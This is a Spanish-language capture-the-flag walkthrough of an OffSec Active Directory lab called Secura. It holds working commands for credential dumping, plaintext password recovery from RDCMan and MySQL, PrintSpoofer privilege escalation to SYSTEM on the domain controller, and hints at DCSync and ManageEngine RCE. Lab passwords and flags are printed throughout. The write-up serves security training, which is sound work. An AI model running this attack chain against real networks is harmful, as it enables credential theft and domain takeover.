# Secura — OffSec Challenge Lab (Assumed Breach) — Walkthrough completo

> Dominio: **secura.yzx** · Escenario: **Assumed Breach** (te dan credenciales de dominio de bajo privilegio).
> Objetivo: comprometer el **Domain Controller** y sacar las flags *user* y *root*.
>
> **Resumen de la vía más corta:**
> `Eric (admin local en SECURE)` → RDCMan con pass en claro → `apache` (admin local en ERA vía WinRM) → MySQL/XAMPP como root → tabla `creds` con `charlotte` + `administrator` → `charlotte` tiene **WinRM + SeImpersonate en el DC** → **PrintSpoofer → SYSTEM** → root flag.
>
> El CVE de ManageEngine (CVE‑2020‑14008) de la descripción **no hace falta**: el assumed‑breach ya da admin local en la caja de ManageEngine. Lo documento como vía alternativa al final.

---

## 0. Datos del lab (ajusta IPs a tu sesión)

| Rol | Host | IP (ejemplo) | Puertos clave |
|---|---|---|---|
| Atacante (Kali, VPN `tun0`) | kali | 192.168.45.190 | — |
| **DC** | DC01 | 192.168.187.97 | 53, 88, 389, 636, 3268, 445, 5985 |
| Member (ManageEngine) | SECURE | 192.168.187.95 | 445, 3389, 5985, **8443 (ManageEngine AppManager)** |
| Member (XAMPP) | ERA | 192.168.187.96 | 445, **3306 (MySQL)**, 5985 |

Credenciales iniciales (assumed breach):

```
secura.yzx\Eric.Wallows : EricLikesRunning800
```

Exporta las IPs para copiar/pegar los comandos tal cual:

```bash
DC=192.168.187.97      # DC01
SECURE=192.168.187.95  # SECURE  (ManageEngine)
ERA=192.168.187.96     # ERA     (XAMPP/MySQL)
```

> **Tip de entorno (importante):** si tu shell es **zsh**, NO hace *word‑splitting* de variables; pasa los flags de `curl`/`ssh` **literales** (no metas todos los flags en una sola `$VAR`). En este lab usamos `nxc`/`evil-winrm`, así que no afecta, pero tenlo en cuenta.

---

## 1. Enumeración

### 1.1 Barrido de puertos (TCP connect, sin sudo)

```bash
nmap -Pn -sT -n --open \
  -p 53,88,135,139,389,445,464,593,636,1433,3268,3389,5985,8020,8080,8383,8443 \
  $DC $SECURE $ERA
```

Lectura:
- **.97 = DC01** → tiene 53/88/389/636/3268 (AD DS) → es el **Domain Controller** (objetivo final).
- **.95 = SECURE** → 8443 + RDP.
- **.96 = ERA** → member normal.

### 1.2 Fingerprint SMB + validar las creds de Eric

```bash
# hostnames / dominio
nxc smb $SECURE $ERA $DC

# ¿dónde valen las creds de Eric?
nxc smb  $SECURE $ERA $DC -u Eric.Wallows -p 'EricLikesRunning800'
nxc winrm $SECURE $ERA $DC -u Eric.Wallows -p 'EricLikesRunning800'
```

Resultado clave:

```
SMB   192.168.187.97  DC01    (domain:secura.yzx)   Server 2016
SMB   192.168.187.96  ERA     (domain:secura.yzx)   Win10/2019
SMB   192.168.187.95  SECURE  (domain:secura.yzx)   Win10/2019
SMB   192.168.187.95  SECURE  [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)   <-- admin local
WINRM 192.168.187.95  SECURE  [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
```

➡️ **Eric es administrador local de SECURE** y entra por WinRM. Ese es el foothold (sin tocar el CVE).

---

## 2. SECURE (.95) — foothold + credenciales de RDCMan

### 2.1 Flag de SECURE y volcado de SAM/LSA

```bash
# flag
nxc winrm $SECURE -u Eric.Wallows -p 'EricLikesRunning800' \
  -X 'Get-Content C:\Users\Administrator\Desktop\proof.txt'

# volcado de credenciales locales (Eric es admin)
nxc smb $SECURE -u Eric.Wallows -p 'EricLikesRunning800' --sam --lsa
```

📌 **Flag SECURE:** `25958a342d62c4656f535432bca3d5e5`

### 2.2 Buscar y leer `RDCMan.settings`

Remote Desktop Connection Manager guarda perfiles de conexión y **a veces la contraseña en claro**.

```bash
# localizar el fichero (ignora los duplicados por reparse points "Application Data")
nxc winrm $SECURE -u Eric.Wallows -p 'EricLikesRunning800' \
  -X "Get-ChildItem C:\Users -Recurse -Force -ErrorAction SilentlyContinue -Include RDCMan.settings | Select -Expand FullName"

# leerlo
nxc winrm $SECURE -u Eric.Wallows -p 'EricLikesRunning800' \
  -X "Get-Content 'C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings'"
```

Dentro, un perfil apuntando a `era.secura.yzx` con la contraseña **en claro**:

```xml
<credentialsProfile>
  <profileName scope="Local">SECURE\apache</profileName>
  <userName>apache</userName>
  <password>New2Era4.!</password>
  <domain>SECURE</domain>
</credentialsProfile>
```

➡️ Credencial recuperada: **`apache : New2Era4.!`**

---

## 3. ERA (.96) — pivot con `apache` + privesc por MySQL

### 3.1 `apache` es admin local de ERA… vía WinRM con *local auth*

`apache` es cuenta **local** de ERA (no de dominio). Ojo con el flag `--local-auth`:

```bash
# como dominio falla; como LOCAL funciona:
nxc smb   $ERA -u apache -p 'New2Era4.!' --local-auth
nxc winrm $ERA -u apache -p 'New2Era4.!' --local-auth        # -> (Pwn3d!)
```

> **Gotcha:** sin `--local-auth`, nxc intenta `secura.yzx\apache` y da `STATUS_LOGON_FAILURE`. `apache` está en **Remote Management Users** (WinRM ok) pero **no** es admin SMB, así que `--sam` no funciona todavía.

Flag de usuario de ERA (en el escritorio de apache):

```bash
nxc winrm $ERA -u apache -p 'New2Era4.!' --local-auth \
  -X 'Get-Content C:\Users\apache\Desktop\local.txt'
```

📌 **Flag ERA (local/apache):** `8b81bc49b1fd1bca22524296e2bc98ae`

### 3.2 XAMPP / MariaDB como SYSTEM → base de datos `creds`

ERA tiene **MySQL en 3306** y XAMPP en `C:\xampp`. El servicio MySQL corre como SYSTEM y **root no tiene contraseña**.

> **Tip de comillas:** dentro de `nxc -X` las comillas anidadas rompen PowerShell. Lo más cómodo es lanzar `evil-winrm` y, como el binario no tiene espacios, invocarlo **directo** (sin el operador `&`, que además lo bloquean algunos hooks). Alimenta evil‑winrm por *stdin*:

```bash
cat > ew.sh <<'EOF'
C:\xampp\mysql\bin\mysql.exe -u root -e 'show databases'
C:\xampp\mysql\bin\mysql.exe -u root -e 'show tables' creds
C:\xampp\mysql\bin\mysql.exe -u root -e 'select name,pass from creds.creds'
exit
EOF
cat ew.sh | evil-winrm -i $ERA -u apache -p 'New2Era4.!'
```

Salida:

```
Database          |  creds  information_schema  mysql  performance_schema  phpmyadmin  test
name           pass
administrator  Almost4There8.?
charlotte      Game2On4.!
```

➡️ Credenciales nuevas:
- **`charlotte : Game2On4.!`**  (¡usuaria de **dominio**!)
- **`administrator : Almost4There8.?`**  (admin **local** de ERA)

### 3.3 (opcional) Flag root de ERA

`administrator:Almost4There8.?` es admin local de ERA:

```bash
nxc smb $ERA -u administrator -p 'Almost4There8.?' --local-auth      # (Pwn3d!)
nxc winrm $ERA -u administrator -p 'Almost4There8.?' --local-auth \
  -X 'Get-Content C:\Users\Administrator\Desktop\proof.txt'
```

📌 **Flag ERA (root/Administrator):** `1737237c44059f7341160ba80c8f39b3`

---

## 4. DC01 (.97) — de `charlotte` a SYSTEM

### 4.1 `charlotte` entra al DC por WinRM

```bash
nxc smb   $DC $SECURE $ERA -u charlotte -p 'Game2On4.!'    # válida en todo el dominio
nxc winrm $DC -u charlotte -p 'Game2On4.!'                 # -> DC01 (Pwn3d!)
```

Flag de **usuario** del DC:

```bash
nxc winrm $DC -u charlotte -p 'Game2On4.!' \
  -X 'Get-Content C:\Users\charlotte\Desktop\local.txt'
```

📌 **Flag DC01 (USER):** `c09b4697bb91ee4fedee4ca742ff3b92`

### 4.2 `charlotte` tiene **SeImpersonatePrivilege** → Potato a SYSTEM

```bash
nxc winrm $DC -u charlotte -p 'Game2On4.!' -X 'whoami /priv'
```

```
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled   <-- 🎯
```

Con SeImpersonate, **PrintSpoofer** (o GodPotato) nos da SYSTEM. Binarios en Kali (p.ej. `/usr/share/` o tu kit); aquí usé `PrintSpoofer64.exe`.

> GodPotato‑NET4 falló en este 2016 con `0x80070776`; **PrintSpoofer64 funcionó**.

Como el `-c` de PrintSpoofer no devuelve stdout por WinRM, **redirige la salida a un fichero** que charlotte pueda leer:

```bash
cat > dc.sh <<'EOF'
upload PrintSpoofer64.exe PrintSpoofer64.exe
.\PrintSpoofer64.exe -c "cmd /c whoami > C:\Users\charlotte\who.txt"
.\PrintSpoofer64.exe -c "cmd /c dir /s /b C:\Users\proof.txt > C:\Users\charlotte\find.txt"
Start-Sleep -Seconds 2
Get-Content C:\Users\charlotte\who.txt
Get-Content C:\Users\charlotte\find.txt
exit
EOF
cat dc.sh | evil-winrm -i $DC -u charlotte -p 'Game2On4.!'
```

```
secura\dc01$                                   <-- contexto SYSTEM (cuenta de máquina del DC)
C:\Users\Administrator.DC01\Desktop\proof.txt  <-- ruta real de la root flag
```

### 4.3 Leer la **root flag**

```bash
cat > root.sh <<'EOF'
.\PrintSpoofer64.exe -c "cmd /c type C:\Users\Administrator.DC01\Desktop\proof.txt > C:\Users\charlotte\root.txt"
Start-Sleep -Seconds 2
Get-Content C:\Users\charlotte\root.txt
exit
EOF
cat root.sh | evil-winrm -i $DC -u charlotte -p 'Game2On4.!'
```

📌 **Flag DC01 (ROOT):** `d35d8cb5fea6747234694f99f19374ec`

> 🏁 **Dominio comprometido.** Desde SYSTEM en el DC podrías además DCSync (`impacket-secretsdump 'secura.yzx/charlotte:Game2On4.!'@$DC` tras darte DA, o `nxc smb $DC --ntds` como admin) para volcar todos los hashes del dominio.

---

## 5. Resumen de flags

| Host | Flag | Valor |
|---|---|---|
| SECURE (.95) | proof | `25958a342d62c4656f535432bca3d5e5` |
| ERA (.96) | local (apache) | `8b81bc49b1fd1bca22524296e2bc98ae` |
| ERA (.96) | proof (admin) | `1737237c44059f7341160ba80c8f39b3` |
| **DC01 (.97)** | **user** | `c09b4697bb91ee4fedee4ca742ff3b92` |
| **DC01 (.97)** | **root** | `d35d8cb5fea6747234694f99f19374ec` |

### Cadena de credenciales

```
Eric.Wallows:EricLikesRunning800   (dado)        -> admin local SECURE
   └─ RDCMan.settings                              -> apache:New2Era4.!
        └─ WinRM local en ERA + MySQL root (XAMPP) -> tabla creds:
             ├─ administrator:Almost4There8.?       (admin local ERA)
             └─ charlotte:Game2On4.!                (dominio, WinRM en DC)
                  └─ SeImpersonate en DC + PrintSpoofer -> SYSTEM -> root flag
```

---

## 6. Vía alternativa — ManageEngine CVE‑2020‑14008 (como dice la descripción)

No es necesaria (Eric ya es admin en SECURE), pero si quisieras hacerla “por el libro”:

1. Fingerprint del servicio en `https://$SECURE:8443/` (ManageEngine Applications Manager → cabecera `Server: AppManager`).
2. Login con credenciales por defecto **admin:admin**.
3. CVE‑2020‑14008 (RCE autenticada en ManageEngine) → *reverse shell* como la cuenta de servicio (privilegiada) en SECURE.
4. A partir de ahí, mismo camino: RDCMan → apache → MySQL → charlotte → SeImpersonate/PrintSpoofer → DC.

---

## 7. Notas / gotchas que te ahorran tiempo

- **`--local-auth`**: cuentas locales (`apache`, `administrator` de ERA) solo validan con este flag; sin él nxc prueba `dominio\usuario` y falla.
- **“Pwn3d!” en WinRM ≠ admin SMB**: `apache` podía ejecutar por WinRM (Remote Management Users) pero no volcar SAM; para eso necesitabas `administrator:Almost4There8.?`.
- **Comillas anidadas en `nxc -X`**: usa `evil-winrm` por stdin y binarios sin espacios invocados directos (evita el operador `&`).
- **Potatoes**: si GodPotato da `0x80070776`, prueba **PrintSpoofer64**. Su `-c` no te devuelve stdout por WinRM → **redirige a fichero** y léelo.
- **Ruta de la root flag**: el perfil del admin del DC es `C:\Users\Administrator.DC01\...`, no `C:\Users\Administrator\...` (por eso charlotte veía “does not exist”).
